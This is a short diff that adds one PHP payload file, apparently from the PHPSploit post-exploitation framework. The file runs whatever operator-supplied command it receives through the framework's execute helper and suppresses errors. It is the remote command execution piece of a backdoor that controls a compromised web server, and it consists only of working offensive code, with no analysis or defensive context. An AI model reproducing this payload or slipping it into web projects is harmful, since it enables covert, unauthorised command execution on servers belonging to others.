+++ plugins/system/run/payload.php
@@ -1,0 +1,7 @@
+<?
+
+!import(execute)
+
+return @execute($PHPSPLOIT['CMD']);
+
+?>